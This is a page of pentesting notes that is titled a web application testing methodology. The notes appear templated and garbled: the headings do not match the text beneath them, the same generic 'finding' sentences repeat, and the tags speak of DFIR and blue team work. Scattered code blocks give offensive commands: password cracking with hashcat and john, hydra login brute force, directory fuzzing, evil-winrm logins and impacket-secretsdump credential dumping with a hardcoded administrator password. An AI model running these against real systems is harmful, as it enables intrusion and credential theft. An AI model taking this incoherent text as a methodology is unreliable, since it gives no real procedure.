---
TitleSEO: "Web Application Penetration Testing Methodology | ZureFX"
TitlePost: "Web Application Penetration Testing Methodology"
Author: "ZureFX"
Description: "Personal notes on Web Application Penetration Testing Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, blue team, lateral movement, oscp, windows, enumeration"
URL: "https://zurefx.github.io/notes/note-web-application-penetration-testing-meth-678.html"
URL_IMAGES: ""
Date: "2025-05-03"
Tags: "DFIR, Blue Team, Lateral Movement, OSCP, Windows, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-web-application-penetration-testing-meth-678"
Permalink: "/notes/note-web-application-penetration-testing-meth-678.html"
BtnLabel: "Read Notes"
Pick: 0
---
## socat

### bloodhound

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.83.239.133/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

> **Note:** Weak Service Permissions was identified as the primary attack vector in this scenario.

```bash
evil-winrm -i 10.117.202.20 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.41.219
```

## Weak Service Permissions

### Bash

The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory.

Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

## impacket

### PHP

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

- `wpscan`
- `Resource-Based Constrained Delegation`
- `msfvenom`
- `kerbrute`
- `Insecure Deserialization`
- `enum4linux`

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.65.89.234/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.70.94.157/FUZZ
```

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.70.85.249
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.120.48.119 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.194.225/FUZZ
```
